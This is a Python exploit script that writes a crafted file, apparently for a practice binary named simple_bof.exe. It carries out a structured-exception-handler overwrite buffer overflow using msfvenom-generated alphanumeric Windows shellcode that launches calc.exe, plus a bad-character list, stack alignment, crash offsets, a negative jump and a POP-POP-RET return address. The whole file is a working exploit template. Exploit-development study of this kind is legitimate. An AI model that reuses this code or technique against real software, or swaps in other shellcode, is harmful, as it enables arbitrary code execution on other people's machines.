import sys, struct

filename = "overflow_simple-bof.txt"

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_upper -f python -b '\x00\x0a\x0d' -v shellcode
# Payload size: 447 bytes
shellcode =  ""
shellcode += "\x89\xe0\xd9\xcf\xd9\x70\xf4\x58\x50\x59\x49\x49"
shellcode += "\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
shellcode += "\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
shellcode += "\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
shellcode += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
shellcode += "\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a\x48\x4d"
shellcode += "\x52\x55\x50\x43\x30\x55\x50\x43\x50\x4d\x59\x4d"
shellcode += "\x35\x50\x31\x39\x50\x52\x44\x4c\x4b\x50\x50\x36"
shellcode += "\x50\x4c\x4b\x51\x42\x34\x4c\x4c\x4b\x50\x52\x52"
shellcode += "\x34\x4c\x4b\x53\x42\x47\x58\x44\x4f\x58\x37\x51"
shellcode += "\x5a\x51\x36\x56\x51\x4b\x4f\x4e\x4c\x57\x4c\x55"
shellcode += "\x31\x33\x4c\x33\x32\x36\x4c\x31\x30\x4f\x31\x38"
shellcode += "\x4f\x54\x4d\x53\x31\x48\x47\x5a\x42\x4c\x32\x56"
shellcode += "\x32\x46\x37\x4c\x4b\x51\x42\x44\x50\x4c\x4b\x50"
shellcode += "\x4a\x37\x4c\x4c\x4b\x30\x4c\x54\x51\x32\x58\x5a"
shellcode += "\x43\x30\x48\x55\x51\x58\x51\x56\x31\x4c\x4b\x36"
shellcode += "\x39\x51\x30\x33\x31\x48\x53\x4c\x4b\x31\x59\x55"
shellcode += "\x48\x4a\x43\x56\x5a\x50\x49\x4c\x4b\x30\x34\x4c"
shellcode += "\x4b\x55\x51\x39\x46\x50\x31\x4b\x4f\x4e\x4c\x59"
shellcode += "\x51\x58\x4f\x34\x4d\x55\x51\x38\x47\x56\x58\x4b"
shellcode += "\x50\x42\x55\x5a\x56\x35\x53\x33\x4d\x4a\x58\x37"
shellcode += "\x4b\x33\x4d\x37\x54\x44\x35\x4b\x54\x30\x58\x4c"
shellcode += "\x4b\x46\x38\x51\x34\x33\x31\x49\x43\x43\x56\x4c"
shellcode += "\x4b\x44\x4c\x50\x4b\x4c\x4b\x50\x58\x55\x4c\x55"
shellcode += "\x51\x4e\x33\x4c\x4b\x45\x54\x4c\x4b\x55\x51\x48"
shellcode += "\x50\x4c\x49\x57\x34\x51\x34\x51\x34\x31\x4b\x51"
shellcode += "\x4b\x33\x51\x46\x39\x31\x4a\x36\x31\x4b\x4f\x4b"
shellcode += "\x50\x51\x4f\x51\x4f\x51\x4a\x4c\x4b\x54\x52\x5a"
shellcode += "\x4b\x4c\x4d\x51\x4d\x52\x4a\x53\x31\x4c\x4d\x4c"
shellcode += "\x45\x58\x32\x33\x30\x43\x30\x43\x30\x56\x30\x32"
shellcode += "\x48\x50\x31\x4c\x4b\x32\x4f\x4d\x57\x4b\x4f\x38"
shellcode += "\x55\x4f\x4b\x4a\x50\x4e\x55\x39\x32\x56\x36\x53"
shellcode += "\x58\x49\x36\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f\x59"
shellcode += "\x45\x47\x4c\x43\x36\x43\x4c\x45\x5a\x4d\x50\x4b"
shellcode += "\x4b\x4b\x50\x53\x45\x44\x45\x4f\x4b\x30\x47\x52"
shellcode += "\x33\x43\x42\x42\x4f\x52\x4a\x43\x30\x36\x33\x4b"
shellcode += "\x4f\x38\x55\x33\x53\x35\x31\x42\x4c\x55\x33\x46"
shellcode += "\x4e\x53\x55\x33\x48\x53\x55\x53\x30\x41\x41"

# Badchars
badchars = (
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        )

# Align ESP
align_esp = (
                "\x54"              # PUSH ESP
                "\x58"              # POP EAX
                "\x66\x05\x56\x05"  # ADD AX, 0x556
                "\x50"              # PUSH EAX
                "\x5c"              # POP ESP
)

# NOP's
nop = "\x41" * 32

# Maximum length
maxlen = 5000

# Offsets
crash_ebp = 512                                     # Buffer length 344
crash_edx = 856
crash_ecx = 860                                     # Buffer length 140
crash_nseh = 796                                    # Buffer length 52
ret_nseh_jmp = 704                                  # Space for first buffer after NSEH negative JMP

# Negative jump to jump back to beginning of buffer
neg_jmp = "\xE9\x43\xFD\xFF\xFF"                    # jmp 0xfffffd48

# Building variables
prefix = "A" * 8
prefix += align_esp
prefix += nop
prefix += shellcode
prefix += "B" * (ret_nseh_jmp - len(prefix))
prefix += neg_jmp
prefix += "C" * (crash_nseh - len(prefix))
nseh = "\x4c\x4c\x77\xa0"                           # DEC ESP # DEC ESP # JA SHORT
seh = struct.pack("<L", 0x00401758)                 # pop esi # pop edi # ret  # simple_bof.exe
suffix = "D" * (maxlen - len(prefix + nseh + seh))

# Crafting payload
payload = prefix + nseh + seh + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()

